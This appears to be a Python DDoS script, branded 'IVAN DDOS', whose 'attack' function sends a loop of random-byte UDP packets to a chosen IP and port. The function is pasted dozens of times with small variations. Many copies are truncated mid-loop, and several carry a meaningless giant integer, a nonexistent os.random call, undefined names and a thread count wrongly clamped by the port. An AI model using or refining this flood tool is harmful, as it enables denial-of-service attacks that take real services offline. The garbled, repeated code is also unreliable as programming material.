def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

